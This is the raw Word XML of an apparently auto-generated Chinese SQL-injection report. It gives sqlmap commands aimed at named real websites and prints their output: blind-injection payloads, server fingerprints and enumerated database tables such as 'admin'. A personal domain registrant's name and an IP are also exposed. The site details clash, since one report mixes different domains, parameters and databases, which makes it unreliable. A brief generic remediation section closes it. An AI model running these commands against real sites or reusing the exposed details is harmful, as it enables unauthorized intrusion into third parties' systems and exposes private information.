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厂商信息：台湾COCO奶茶有限公司</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Title"/>
      </w:pPr>
      <w:r>
        <w:t>漏洞简述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Subtitle"/>
      </w:pPr>
      <w:r>
        <w:t>漏洞描述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="UserStyle1"/>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UserStyle1"/>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r>
        <w:br/>
        <w:t>发现时间</w:t>
        <w:tab/>
        <w:t>2019-05-01:17:16:26</w:t>
        <w:br/>
        <w:t>网站标题</w:t>
        <w:tab/>
        <w:t>厦门亮群餐饮管理有限公司-产品展示-元茶圆- 所有</w:t>
        <w:br/>
        <w:t>注入网址</w:t>
        <w:tab/>
        <w:t>http://yuanchayuan.cn/article.php?c=433</w:t>
        <w:br/>
        <w:t>执行命令</w:t>
        <w:tab/>
        <w:t>sqlmap.py -u http://yuanchayuan.cn/article.php?c=433 --technique B --batch --thread=10 --random-agent</w:t>
        <w:br/>
        <w:t>注入参数(方式)</w:t>
        <w:tab/>
        <w:t>c (GET)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    注入方式</w:t>
        <w:tab/>
        <w:t>boolean-based blind</w:t>
        <w:br/>
        <w:t xml:space="preserve">    注入标题</w:t>
        <w:tab/>
        <w:t>AND boolean-based blind - WHERE or HAVING clause</w:t>
        <w:br/>
        <w:t xml:space="preserve">    注入攻击</w:t>
        <w:tab/>
        <w:t>c=433 AND 7482=7482</w:t>
        <w:br/>
        <w:t>数据库类型</w:t>
        <w:tab/>
        <w:t>SQLite</w:t>
        <w:br/>
        <w:t>服务器版本</w:t>
        <w:tab/>
        <w:t>Windows 2008 R2 or 7</w:t>
        <w:br/>
        <w:t>服务器语言</w:t>
        <w:tab/>
        <w:t>Microsoft IIS 7.5, ASP.NET, PHP 5.3.8</w:t>
        <w:br/>
        <w:t>数据库版本</w:t>
        <w:tab/>
        <w:t>SQLite</w:t>
        <w:br/>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Subtitle"/>
      </w:pPr>
      <w:r>
        <w:t>网站信息报表</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br/>
        <w:t>百度权重</w:t>
        <w:tab/>
        <w:t>4</w:t>
        <w:br/>
        <w:t>网站主页</w:t>
        <w:tab/>
        <w:t>http://www.35335.com</w:t>
        <w:br/>
        <w:t>网站标题</w:t>
        <w:tab/>
        <w:t>窝趣轻社区加盟_窝趣轻社区加盟费用|电话-35加盟网</w:t>
        <w:br/>
        <w:t>IP__坐标</w:t>
        <w:tab/>
        <w:t>加拿大 安大略省多伦多腾讯云计算有限公司北美数据中心</w:t>
        <w:br/>
        <w:t>所属__IP</w:t>
        <w:tab/>
        <w:t>49.51.10.192</w:t>
        <w:br/>
        <w:t>网站年龄</w:t>
        <w:tab/>
        <w:t>9年6月29天（创建于2009年10月02日,过期时间为2019年10月02日)</w:t>
        <w:br/>
        <w:t>备案编号</w:t>
        <w:tab/>
        <w:t>粤ICP备17146273号-1</w:t>
        <w:br/>
        <w:t>备案性质</w:t>
        <w:tab/>
        <w:t>个人</w:t>
        <w:br/>
        <w:t>备案名称</w:t>
        <w:tab/>
        <w:t>李邦华</w:t>
        <w:br/>
        <w:t>备案时间</w:t>
        <w:tab/>
        <w:t>2017/11/20 0:00:00</w:t>
        <w:br/>
        <w:t>百度收录</w:t>
        <w:tab/>
        <w:t>17万5000</w:t>
        <w:br/>
        <w:t>协议类型</w:t>
        <w:tab/>
        <w:t>HTTP/1.1 200 OK</w:t>
        <w:br/>
        <w:t>页面类型</w:t>
        <w:tab/>
        <w:t>text/html; charset=UTF-8</w:t>
        <w:br/>
        <w:t>服务类型</w:t>
        <w:tab/>
        <w:t>nginx/1.12.2</w:t>
        <w:br/>
        <w:t>程序语言</w:t>
        <w:tab/>
        <w:t>暂无信息</w:t>
        <w:br/>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Subtitle"/>
      </w:pPr>
      <w:r>
        <w:t>网站漏洞复现</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>执行命令[待会儿上色]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="UserStyle1"/>
      </w:pPr>
      <w:r>
        <w:br/>
        <w:t>sqlmap.py -u http://yuanchayuan.cn/article.php?c=433 --technique B --batch --thread=10 --random-agent</w:t>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>返回内容[待会儿上色]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="UserStyle1"/>
      </w:pPr>
      <w:r>
        <w:br/>
        <w:t>[*] starting @ 22:45:29 /2019-05-01/</w:t>
        <w:br/>
        <w:t>[22:45:29] [INFO] fetched random HTTP User-Agent header value 'Mozilla/4.0 (compatible; MSIE 5.05; Windows 98; .NET CLR 1.1.4322)' from file 'D:\HACKER_TOOLS\LANGZI_HACKER\LANGZI_SQL_INJECTION\Langagents.txt'</w:t>
        <w:br/>
        <w:t>[22:45:29] [INFO] resuming back-end DBMS 'sqlite'</w:t>
        <w:br/>
        <w:t>[22:45:29] [INFO] testing connection to the target URL</w:t>
        <w:br/>
        <w:t>[22:45:30] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS</w:t>
        <w:br/>
        <w:t>sqlmap resumed the following injection point(s) from stored session:</w:t>
        <w:br/>
        <w:t>---</w:t>
        <w:br/>
        <w:t>Parameter: id (GET)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Type: boolean-based blind</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Title: AND boolean-based blind - WHERE or HAVING clause</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Payload: id=611 AND 1829=1829</w:t>
        <w:br/>
        <w:t>---</w:t>
        <w:br/>
        <w:t>[22:45:30] [INFO] the back-end DBMS is SQLite</w:t>
        <w:br/>
        <w:t>web server operating system: Windows 2008 R2 or 7</w:t>
        <w:br/>
        <w:t>web application technology: Microsoft IIS 7.5, ASP.NET, PHP 5.3.8</w:t>
        <w:br/>
        <w:t>back-end DBMS: SQLite</w:t>
        <w:br/>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>敏感数据[待会儿上色]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="UserStyle1"/>
      </w:pPr>
      <w:r>
        <w:br/>
        <w:br/>
        <w:t>注入参数(方式) : id (Cookie)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    注入方式 : boolean-based blind</w:t>
        <w:br/>
        <w:t xml:space="preserve">    注入标题 : AND boolean-based blind - WHERE or HAVING clause</w:t>
        <w:br/>
        <w:t xml:space="preserve">    注入攻击 : id=120 AND 6114=6114</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:t>---------</w:t>
        <w:br/>
        <w:t>数据库类型 : Microsoft Access</w:t>
        <w:br/>
        <w:t>服务器版本 : Windows 2008 R2 or 7</w:t>
        <w:br/>
        <w:t>服务器语言 : ASP.NET, Microsoft IIS 7.5, ASP</w:t>
        <w:br/>
        <w:t>数据库版本 : Microsoft Access</w:t>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>执行命令[待]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>python sqlmap.py -u http://www.sdcxjl.com/hr/show.asp --cookie id=120 --tables --level 3  --random-agent --batch</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>返回结果[待]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="UserStyle1"/>
      </w:pPr>
      <w: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17:56:34 /2019-05-02/</w:t>
        <w:br/>
        <w:br/>
        <w:t>[17:56:35] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.8) Gecko/20100806 Firefox/3.6' from file 'C:\CODE\个人作品源r-agents.txt'</w:t>
        <w:br/>
        <w:t xml:space="preserve">[17:56:35] [INFO] resuming back-end DBMS 'microsoft access' </w:t>
        <w:br/>
        <w:t>[17:56:35] [INFO] testing connection to the target URL</w:t>
        <w:br/>
        <w:t>[17:56:35] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS</w:t>
        <w:br/>
        <w:t>sqlmap resumed the following injection point(s) from stored session:</w:t>
        <w:br/>
        <w:t>---</w:t>
        <w:br/>
        <w:t>Parameter: id (Cookie)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Type: boolean-based blind</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Title: AND boolean-based blind - WHERE or HAVING clause</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Payload: id=120 AND 6114=6114</w:t>
        <w:br/>
        <w:t>---</w:t>
        <w:br/>
        <w:t>[17:56:35] [INFO] the back-end DBMS is Microsoft Access</w:t>
        <w:br/>
        <w:t>web server operating system: Windows 2008 R2 or 7</w:t>
        <w:br/>
        <w:t>web application technology: ASP.NET, Microsoft IIS 7.5, ASP</w:t>
        <w:br/>
        <w:t>back-end DBMS: Microsoft Access</w:t>
        <w:br/>
        <w:t>[17:56:35] [INFO] fetching tables for database: 'Microsoft_Access_masterdb'</w:t>
        <w:br/>
        <w:t>[17:56:35] [INFO] fetching number of tables for database 'Microsoft_Access_masterdb'</w:t>
        <w:br/>
        <w:t>[17:56:35] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval</w:t>
        <w:br/>
        <w:t xml:space="preserve">[17:56:35] [INFO] retrieved: </w:t>
        <w:br/>
        <w:t>do you want to URL encode cookie values (implementation specific)? [Y/n] Y</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">[17:56:35] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' </w:t>
        <w:br/>
        <w:t>[17:56:35] [WARNING] unable to retrieve the number of tables for database 'Microsoft_Access_masterdb'</w:t>
        <w:br/>
        <w:t>[17:56:35] [ERROR] cannot retrieve table names, back-end DBMS is Access</w:t>
        <w:br/>
        <w:t>do you want to use common table existence check? [Y/n/q] Y</w:t>
        <w:br/>
        <w:t>which common tables (wordlist) file do you want to use?</w:t>
        <w:br/>
        <w:t>[1] default 'C:\CODE\个人作品源代码bles.txt' (press Enter)</w:t>
        <w:br/>
        <w:t>[2] custom</w:t>
        <w:br/>
        <w:t>&gt; 1</w:t>
        <w:br/>
        <w:t>[17:56:35] [INFO] checking table existence using items from 'C:\CODE\个人作品源代码\es.txt'</w:t>
        <w:br/>
        <w:t>[17:56:36] [INFO] adding words used on web page to the check list</w:t>
        <w:br/>
        <w:t>please enter number of threads? [Enter for 1 (current)] 1</w:t>
        <w:br/>
        <w:t>[17:56:36] [WARNING] running in a single-thread mode. This could take a while</w:t>
        <w:br/>
        <w:t>[17:56:41] [INFO] tried 55/3150 items (2%)[17:56:41] [INFO] retrieved: admin</w:t>
        <w:br/>
        <w:t>[17:57:41] [INFO] tried 497/3150 items (16%)[17:57:41] [INFO] retrieved: feedback</w:t>
        <w:br/>
        <w:t>[17:59:58] [INFO] tried 1502/3150 items (48%)[17:59:59] [INFO] retrieved: flag</w:t>
        <w:br/>
        <w:t>[18:01:03] [INFO] tried 2006/3150 items (64%)</w:t>
        <w:br/>
        <w:t>[18:01:33] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)</w:t>
        <w:br/>
        <w:t>[18:03:14] [INFO] tried 2672/3150 items (85%)</w:t>
        <w:br/>
        <w:t>[18:03:44] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)</w:t>
        <w:br/>
        <w:t>[18:03:57] [INFO] tried 2674/3150 items (85%)</w:t>
        <w:br/>
        <w:t>[18:04:27] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)</w:t>
        <w:br/>
        <w:t>[18:05:03] [INFO] tried 2675/3150 items (85%)</w:t>
        <w:br/>
        <w:t>[18:05:34] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)</w:t>
        <w:br/>
        <w:t>[18:05:34] [INFO] tried 2676/3150 items (85%)</w:t>
        <w:br/>
        <w:t>[18:06:04] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)</w:t>
        <w:br/>
        <w:t>[18:06:24] [INFO] tried 2698/3150 items (86%)</w:t>
        <w:br/>
        <w:t>[18:06:57] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)</w:t>
        <w:br/>
        <w:t>[18:08:23] [INFO] tried 3150/3150 items (100%)</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>敏感数据</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="UserStyle1"/>
      </w:pPr>
      <w:r>
        <w:br/>
        <w:br/>
        <w:t>数据库下列名</w:t>
        <w:br/>
        <w:t>Database: Microsoft_Access_masterdb</w:t>
        <w:br/>
        <w:t>[3 tables]</w:t>
        <w:br/>
        <w:t>+----------+</w:t>
        <w:br/>
        <w:t>| admin    |</w:t>
        <w:br/>
        <w:t>| feedback |</w:t>
        <w:br/>
        <w:t>| flag     |</w:t>
        <w:br/>
        <w:t>+----------+</w:t>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Title"/>
      </w:pPr>
      <w:r>
        <w:t>修复建议</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Subtitle"/>
      </w:pPr>
      <w:r>
        <w:t>代码原理防护</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br/>
        <w:t>1.</w:t>
        <w:tab/>
        <w:t>对用户的输入进行严格过滤，包括所有的参数，URL和HTTP头部等所有需要传给数据库的数据。</w:t>
        <w:br/>
        <w:t>包括但不限于以下字符及字符串</w:t>
        <w:br/>
        <w:t>select and or like regxp from where update exec order by having drop delete ( ) [ ] &lt; &gt; , . ; : ' " # % + - _ = / * @</w:t>
        <w:br/>
        <w:br/>
        <w:t>2.</w:t>
        <w:tab/>
        <w:t>预编译SQL语句，而不要动态组装SQL语句，否则必须确保在使用输入的数据组装成SQL语句之前，对特殊字符进行预处理。</w:t>
        <w:br/>
        <w:t>3.</w:t>
        <w:tab/>
        <w:t>以最小权限执行SQL语句</w:t>
        <w:br/>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Subtitle"/>
      </w:pPr>
      <w:r>
        <w:t>安全防火墙防护</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br/>
        <w:t>1.</w:t>
        <w:tab/>
        <w:t xml:space="preserve">  安装网站防火墙</w:t>
        <w:br/>
        <w:t>2.</w:t>
        <w:tab/>
        <w:t xml:space="preserve">  接入云WAF</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UserStyle1">
    <w:name w:val="UserStyle1"/>
    <w:rPr>
      <w:rFonts w:ascii="微软雅黑" w:hAnsi="微软雅黑" w:eastAsia="微软雅黑"/>
      <w:color w:val="FFDE00"/>
      <w:sz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